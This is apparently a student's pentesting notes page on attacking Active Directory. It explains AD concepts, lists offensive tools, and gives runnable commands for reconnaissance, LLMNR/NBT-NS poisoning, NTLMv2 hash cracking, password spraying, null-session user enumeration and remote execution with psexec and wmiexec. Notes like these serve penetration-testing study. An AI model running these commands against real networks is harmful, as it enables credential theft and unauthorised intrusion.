Navigation: [[Pentesting]]

---
# Table of Contents
1. Overview
2. Tools of the Trade
3. Methodology
4. Enumeration
	1. Passive Recon
	2. Active Recon
5. Initial Foothold
	1. LLMNR/NBT-NS Poisoning
	2. Password Spraying
6. Enumerating Security Controls
	1. Linux
	2. Windows
	3. Windows Native Tools
7. Kerberoasting
8. ACL Attacks
	1. Enumeration
	2. Exploits
	3. DCSync 
9. Lateral Movement
	1. Common Tools
	2. Bleeding Edge Vulnerabilities
10. Domain trusts
	1. Parent Child Trusts
	2. Cross Forest

Useful Stuff:
[`WADComs Cheatsheet`](https://wadcoms.github.io/)
# Active Directory Overview
Here's a [video guide](https://www.youtube.com/watch?v=4qC7H-y7oKI) on active directory that should help to fill in some basic knowledge.

Here's an overview of topics:
1. Active directory architecture
2. Authentication and Authorization
3. Privileges and Permissions
4. Important Attributes
5. Active Directory Certificate Services
### Active Directory Architecture
**Forests**
A forest is the highest level abstraction in AD, containing one or more domains that share a common schema and configuration partition. The first domain in a forest is called the **forest root domain**, and all domains in the forest trust each other by default through transitive trust.

Every forest has a few key components:
1. Schema which defines the objects and their attributes.
2. Global catalog which facilitates searches across domains in the forest.
3. Replication, used for synchronizing changes between domains in the forest.

**Domains**
Domains are the most fundamental part of AD, each having their own DNS name to uniquely identify them. They represent a logical grouping of objects. Each domain has its own security boundary and stores its objects in a central database managed by domain controllers. 

Domains contain a substantial amount of objects:
1. Users
2. Groups
3. Computers
4. Organizational Units: logical containers for groups and objects for easier management
5. Service Accounts
6. Shared folders
7. Group policy objects (expanded below)
8. Trust relationships (expanded below)

**Domain Controllers**
Domain controllers are the servers that host the AD database in the file `ntds.dit`. They also provide directory services such as authentication, authorization, and object look ups.

**Domain Trusts**
These are relationships established between domains or forests to allow users in one domain to access resources in another. Trust can be transitive and either uni or bidirectional.

Types of trust:
- Parent-child: automatically between parent and child domains in the same forest.
- External: manually created between domains in different forests that don't share a forest trust.
- Forest: Connects two forests.
- Shortcut: Reduces authentication latency between two domains in the same forest.
- Realm: Connects AD to a non-Windows Kerberos realm.
### Authentication and Authorization
**Kerberos**
Kerberos is the main authentication system for AD. The authentication process is as follows:
1. User logs in and requests a TGT (ticket granting ticket) from the KDC.
2. KDC sends a TGT, encrypted using the user's own password hash.
3. User presents TGT to request service tickets for specific resources.

**NTLM**
This is a legacy protocol for backwards compatibility. It uses challenge-response based authentication. Password hashes are used instead of plain-text credentials.

**Lightweight Directory Access Protocol**
LDAP is used to query and modify AD objects, but many apps rely on it for user authentication and directory look ups.
### Privileges and Permissions
**Group Policy Objects**
GPOs are collections of policies applied to objects within AD.

**Administrative Groups**
Here are some key administrative groups:
1. Domain admins: have full control over the domain.
2. Enterprise admins: operate across domains in a forest and have elevated privileges.
3. Schema admins: can modify the schema.

**Access Control Lists**
Most important part here is Discretionary Access Control Lists (DACLs). These control permissions regarding AD objects.
### Important Attributes
Here's some important object attributes, grouped by category:
**Authentication and Security**
- **`sAMAccountName`**: Legacy logon name used for authentication (e.g., `jdoe`).
- **`userPrincipalName (UPN)`**: Modern logon name in email format (e.g., `jdoe@domain.com`).
- **`objectSID`**: Unique Security Identifier used to identify the object in security operations.
- **`userAccountControl`**: Bitmask indicating account properties (e.g., disabled, password required).
- **`servicePrincipalName (SPN)`**: Identifies services running on computers for Kerberos authentication.
- **`ms-Mcs-AdmPwd`**: Stores plain-text local administrator passwords in LAPS environments.
- **`allowedWorkstations`**: Lists the computers where the account can log in.
- **`logonHours`**: Specifies the hours the account is allowed to authenticate.

**Life Cycle and Activity**
- **`lastLogon` and `lastLogonTimestamp`**: Indicate the most recent logon activity of the user or computer.
- **`pwdLastSet`**: Tracks the last time the account’s password was changed.
- **`accountExpires`**: Specifies when the account expires (if applicable).
- **`lockoutTime`**: Records when an account was locked out due to failed logon attempts.

**Group Membership and Permissions**
- **`memberOf`**: Lists the groups the object belongs to.
- **`primaryGroupID`**: Indicates the primary group of the object.
- **`adminCount`**: Flags if the object belongs to an administrative group (e.g., Domain Admins).
- **`nTSecurityDescriptor`**: Stores the object’s ACL (Access Control List), defining permissions.

**Computer and Device Specific**
- **`dNSHostName`**: Fully Qualified Domain Name (FQDN) of the computer (e.g., `workstation01.domain.com`).
- **`operatingSystem`**: Indicates the OS version running on the device.
- **`operatingSystemServicePack`**: Specifies the installed service pack version.
- **`lastLogonTimestamp`**: Tracks the last authentication event for the computer.

**Organization and Grouping**
- **`ou`**: Indicates the organizational unit (OU) the object belongs to.
- **`managedBy`**: Specifies the user or group responsible for managing the object.
- **`member`**: Lists the objects that are members of a group.
- **`gPLink`**: Links Group Policy Objects (GPOs) to an organizational unit.

### Active Directory Certificate Services
AD CS provides public key infrastructure for AD. The core components include:
1. Certificate authorities, of which there are root and subordinate CAs. These are responsible for issuing, revoking, and managing digital certificates.
2. Certificate templates. These are predefined configurations that specify attributes and use of certificates.
3. Certificate revocation list
4. Online Certificate Status Protocol: used to check if a certificate is revoked
5. Key archival: process of storing private keys for recovery purposes.

Common use cases for ADCS include:
1. Encrypting traffic
2. Authentication
3. Code signing
# Tools of the Trade
This entire table is taken from HTB Academy:

| Tool                                                                                                                                          | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| --------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                      | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.                                                                                                                                                                                             |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)                                                               | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                       |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py)                                                                                      | A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.                                                                                                                                                                                                                                                                                                                      |
| [Kerbrute](https://github.com/ropnop/kerbrute)                                                                                                | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket)                                                                                | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.                                                                                                                                                                                                                                                                                                                                                                                                                              |
| [Responder](https://github.com/lgandx/Responder)                                                                                              | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)                                                             | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)                                                    | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)                                           | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.                                                                                                                                                             |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)                                                               | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)                                                                             | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.                                                                                                                                                                                                                                                                                                                                  |
| [Rubeus](https://github.com/GhostPack/Rubeus)                                                                                                 | Rubeus is a C# tool built for Kerberos Abuse.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)                                              | Another Impacket module geared towards finding Service Principal names tied to normal users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [Hashcat](https://hashcat.net/hashcat/)                                                                                                       | A great hash cracking and password recovery tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)                                                                                   | A tool for enumerating information from Windows and Samba systems.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)                                                                                       | A rework of the original Enum4linux tool that works a bit differently.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch)                                                                                          | Built-in interface for interacting with the LDAP protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| [windapsearch](https://github.com/ropnop/windapsearch)                                                                                        | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)                                                                    | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)                                                                                      | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).                                                                                                                                                                                                                                                                                                                                                                                              |
| [smbmap](https://github.com/ShawnDEvans/smbmap)                                                                                               | SMB share enumeration across a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)                                                        | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)                                                      | Part of the Impacket toolkit, it provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [Snaffler](https://github.com/SnaffCon/Snaffler)                                                                                              | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)                                                  | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))             | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| [Mimikatz](https://github.com/ParrotSec/mimikatz)                                                                                             | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)                                              | Remotely dump SAM and LSA secrets from a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm)                                                                                       | Provides us with an interactive shell on a host over the WinRM protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                                              | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [noPac.py](https://github.com/Ridter/noPac)                                                                                                   | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)                                                      | Part of the Impacket toolset, RPC endpoint mapper.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)                                                       | Printnightmare PoC in python.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)                                                | Part of the Impacket toolset, it performs SMB relay attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [PetitPotam.py](https://github.com/topotam/PetitPotam)                                                                                        | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)                                                        | Tool for manipulating certificates and TGTs.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)                                                              | This tool will use an existing TGT to request a PAC for the current user using U2U.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [adidnsdump](https://github.com/dirkjanm/adidnsdump)                                                                                          | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)                                                                                        | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)                                                | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.                                                                                                                                                                                                                                                                                                                             |
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)                                                  | SID bruteforcing tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)                                                    | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)                                                | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)                                               | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.                                                                                                                                                   |
| [PingCastle](https://www.pingcastle.com/documentation/)                                                                                       | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                               |
| [Group3r](https://github.com/Group3r/Group3r)                                                                                                 | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [ADRecon](https://github.com/adrecon/ADRecon)                                                                                                 | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.                                                                                                                                                                                                                                                                                                                                                              |
# Methodology
# Enumeration
### External Recon
When starting our external recon, we should be looking for a few key things:

| Data                | Items                                                                       |
| ------------------- | --------------------------------------------------------------------------- |
| Network Information | Valid ASNs, netblocks, cloud presence, DNS entries, hosting providers, etc. |
| Domain Information  | Domains, subdomains, services, and possible defenses.                       |
| Schema Format       | Formats of accounts, valid usernames, etc.                                  |
| Data Discolsure     | Publicly accessible files, credentials in these files (such as on GitHub).  |
| Breach Data         | Any publicly released data, including usernames, passwords, and other info. |
Search locations:

| Resource                    | Locations                                                                                                                                                                                                                                                                                         |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ASN and IP registrars       | [`IANA`](https://www.iana.org/), [`arin`](https://www.arin.net/), [`HE`](https://bgp.he.net/) for Americas, [`RIPE`](https://www.ripe.net/) for Europe.                                                                                                                                           |
| Domain registrars and DNS   | [`Domaintools`](https://www.domaintools.com/), [`PTRArchive`](http://ptrarchive.com/), [`ICANN`](https://lookup.icann.org/lookup) and manual DNS record requests.                                                                                                                                 |
| Social Media                | Self explanatory.                                                                                                                                                                                                                                                                                 |
| Company Websites            | Also self explanatory, focus on "About Us" and "Contact Us" pages though                                                                                                                                                                                                                          |
| Cloud and Developer Storage | GitHub, AWS S3, Azure storage, [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database). [`Trufflehog`](https://github.com/trufflesecurity/truffleHog) and sites like [`Greyhat Warfare`](https://buckets.grayhatwarfare.com/) can be used to find leaked credentials. |
| Breaches                    | [`HaveIBeenPwned`](https://haveibeenpwned.com/) to check if any accounts appear in breach data, [`Dehashed`](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes                                                                                         |
Here's a useful [tool](https://github.com/initstring/linkedin2username) for creating false emails using `LinkedIn` data.
### Internal Enumeration
This section should be largely familiar. See [[Network Enumeration with Nmap]] to get started. Here's some additional tools though:
- [`Fping`](https://fping.org/) for ping scanning
- [`Kerbrute`](https://github.com/ropnop/kerbrute) since Kerberos authentication failures usually don't trigger logs or alerts. 
	- Use [this](https://github.com/insidetrust/statistically-likely-usernames) wordlist for potential usernames.
- [`Responder`](https://github.com/lgandx/Responder-Windows) to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses.
- `TCPDump` and `Wireshark` for a more passive way to find hosts
# Initial Foothold
### LLMNR/NBT-NS Poisoning
LLMNR and NBT-NS are Microsoft backups for when DNS fails. LLMNR is used first, based on the DNS format allowing hosts on the same local link to perform name resolution, and uses `UDP/5355`. A machine will ask all others on the network for the correct host address via LLMNR. When LLMNR fails, NetBIOS Name Service is used over `UDP/137`. 

Here's the general overview of how poisoning works:
1. Host attempts to connect to server, but makes a typo in the address
2. DNS server responds, stating host unknown
3. Host then asks over LLMNR if anyone knows the location of the (incorrectly typed) server address
4. Attacker responds that they have the address
5. Host believes the reply and sends an authentication request to the server with credentials
6. Attacker takes credentials and uses them

**Starting a Poisoning Attack on Linux**
```shell 
sudo responder -I <interface>
```
Once we're able to grab hashes, we can crack using `hashcat`. See [[Password Attacks]]. For quick reference, here's how we can do a `NTMLv2` hash:
```shell
hashcat -m 5600 <hash file> <wordlist>
```
**Poisoning on Windows**
Outdated method:
```PowerShell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters # Print options
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Current method (same tool, author just moved to C#):
```PowerShell
.\Inveigh.exe
```
From here, press `ESC` to enter and exit the interactive console. Type `HELP` to see commands and access hashes.
### Password Spraying
Password spraying should be done sparingly in order to prevent mass account lockout. In order to do it effectively, we should follow a few steps:
1. Enumerate enough to understand the username structure and potential password policy of our target
2. Create a target user list based on this enumeration
3. Spray lightly using our lists
##### Finding a Password Policy
With valid domain credentials, finding a password policy is pretty easy. Here's how we can do it remotely:
```shell
crackmapexec smb <IP> -u <user> -p <pass> --pass-pol
```
But this isn't really the point of this section. Instead we want to know how to find a policy without credentials. This can be done through SMB NULL sessions or LDAP anonymous bind.

Here's some ways we can do SMB Null sessions:

Using [`rpcclient`](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) on Linux:
```shell
rpcclient -U "" -N <IP>
querydominfo # get domain information
getdompwinfo # get password policy
```
Use [enum4linux-ng](https://github.com/cddmp/enum4linux-ng), it's a rewrite of the original with a few extra features:
```shell
enum4linux -P <IP> # deprecated
enum4linux-ng -P <IP> -oA <Output file> 
```

Our next option is LDAP anonymous binds, which allows unauthenticated users to retrieve information about a domain. It's been deprecated as of Windows server 2003.

On Linux, we can use [`ldapsearch`](https://linux.die.net/man/1/ldapsearch): 
```shell
ldapsearch -h <IP> -x -b "DC=<Domain Controller>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Lastly, enumerating from Windows is rare but here's a few commands to do so:
```powershell
# SMB Null
net use \\host\ipc$ "" /u:""
# We can also try using a guest account:
net use \\DC01\ipc$ "password" /u:guest

# Simple commands to display net information
net accounts

# Powershell script
import-module .\PowerView.ps1
Get-DomainPolicy
```
##### Creating a Users List
Here's some ways we can generate a users list:
1. Using the SMB NULL session or LDAP anonymous again
2. `Kerbrute` to validate users utilizing a wordlist from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo or gathered using [`linkedin2username`](https://github.com/initstring/linkedin2username)
3. Using a set of credentials from a system provided by the client or obtained through other means

**SMB Null To Grab Users**
```shell
enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N <IP>
enumdomusers

crackmapexec smb <IP> --users
```
**LDAP Anonymous**
Use [`windapsearch`](https://github.com/ropnop/windapsearch) and [`ldapsearch`](https://linux.die.net/man/1/ldapsearch):
```shell
ldapsearch -h <IP -x -b "DC=<domain>,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip <IP> -u "" -U
```
**Kerbrute**
Using the [`jsmith.txt`](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) wordlist in the format `flast`:
```shell
kerbrute userenum -d <domain> --dc <DC IP> /opt/jsmith.txt 
```

With credentialed enumeration, it's once again really easy to get a users list:
```shell
sudo crackmapexec smb <IP> -u <user> -p <pass> --users
```
##### Spraying from Linux
There's many tools that can be used for this, here's a few:
```shell
# Crackmapexec
sudo crackmapexec smb <host> -u valid_users.txt -p <Password> | grep +
sudo crackmapexec smb <host> -u <User> -p <Password> # validating creds

# Kerbrute
kerbrute passwordspray -d <domain> --dc <IP> valid_users.txt <Password>

# Bash one-liner
for u in $(cat valid_users.txt);do rpcclient -U "$u%<Password>" -c "getusername;quit" <IP> | grep Authority; done
```

Here's a way to spray a hash against many machines:
```shell
sudo crackmapexec smb --local-auth <CIDR Range> -u administrator -H <hash> | grep +
```
The `--local-auth` flag tells the tool to only attempt one log in per machine so we don't lock out an account.
##### Spraying from Windows
Once again this is rare, but the easiest way to do it is from PowerShell using [`DomainPasswordSpray`](https://github.com/dafthack/DomainPasswordSpray):
```PowerShell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <Password> -OutFile spray_success -ErrorAction SilentlyContinue

# This tool generates a user list for us, if we wanted to set one we could use the flag -UserList
```
# Enumerating Security Controls
Before reading this section, check out [[Linux Privilege Escalation]] and [[Windows Privilege Escalation]] for more details regarding local privesc. For any of this enumeration to work, we'll always need valid credentials for at least a single domain user.

### Important Security Controls
**Windows Defender**
Windows has their own firewall that'll block a lot of our tools. If it's enabled, it'll need to be bypassed later. Here's how we can check its status (Look at `RealTimeProtectionEnabled`):
```PowerShell
Get-MpComputerStatus
```
**AppLocker**
This is Microsoft's solution to an application whitelist. It's common for organizations to block `cmd.exe` and `powershell.exe`. Many organizations block only one instance of PowerShell, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations).
```PowerShell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
**PowerShell Constrained Language Mode**
This locks down a lot of PowerShell features, such as blocking COM objects, only allowing approved .NET types, etc. We can check using:
```PowerShell
$ExecutionContext.SessionState.LanguageMode
```
**Windows LAPS**
Microsoft came out with the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to randomize and rotate local admin passwords to help prevent lateral movement. The [`LAPSToolkit`](https://github.com/leoloobeek/LAPSToolkit) helps to enumerate this:
```PowerShell
# Find groups who can read LAPS passwords
Find-LAPSDelegatedGroups

# Check rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights

# Search for computers that have LAPS enabled when passwords expire, and display these passwords if the current user has access
Get-LAPSComputers
```
### Linux Enumeration
There's many tools we can use for this, we'll go over a few here:
**CME**
```shell
# CME gives a help menu for each protocol. For now, we'll only look at ssh
# General access
sudo crackmapexec smb <IP> -u <user> -p <pass>
# Important flags:
# --users: enumerate domain users
# --groups: enumerate domain groups
# --loggedon-users: find which users are currently logged on
# --shares: view SMB shares
# -M spider_plus --share '<share>': enumerates a share
```
##### SMBMap
```shell
# Check accessible shares
smbmap -u <user> -p <pass> -d <domain> -H <IP>
# List all directories in a share
smbmap -u <user> -p <pass> -d <domain> -H <IP> -R '<share>' --dir-only
```
##### RPCClient
[Docs](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
```shell
# Connect to a client
rpcclient -U "" -N <IP>

# RPC commands
queryuser <rid> # Gets user information
enumdomainusers # gets users and rids
```
##### Impacket Toolkit
```shell
# psexec.py gives RCE as SYSTEM by dropping an executable into ADMIN$
psexec.py <domain>/<user>:'<pass>'@<IP> 

# wmiexec.py, generates less logs
wmiexec.py <domain>/<user>:'<pass>'@<IP> 
```

Lastly, another tool we can use is [`Windapsearch`](https://github.com/ropnop/windapsearch).
### Windows Enumeration
##### ActiveDirectory PowerShell Module
[This](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) is a very common module to see since it's commonly used to administrate AD environments from the command line. Here's how we can use it:
```PowerShell
# Check imported modules
Get-Module
# Import the module
Import-Module ActiveDirectory
# Get domain information
Get-ADDomain
# Get users and permissions (discluding service principle accounts)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# Get trust relationships
Get-ADTrust -Filter *
# Get groups
Get-ADGroup -Filter * | select name
# Detailed group info
Get-ADGroup -Identity "<Group name>"
# Get group members
Get-ADGroupMember -Identity "<Group name>"

```
##### PowerView
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a PowerShell tool with a whole lot of different commands we can run. Use the table below for command reference:

| **Command**                         | **Description**                                                                            |
| ----------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**          |                                                                                            |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain                           |
| `Get-DomainUser`                    | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
| **GPO Functions:**                  |                                                                                            |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:** |                                                                                            |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**      |                                                                                            |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
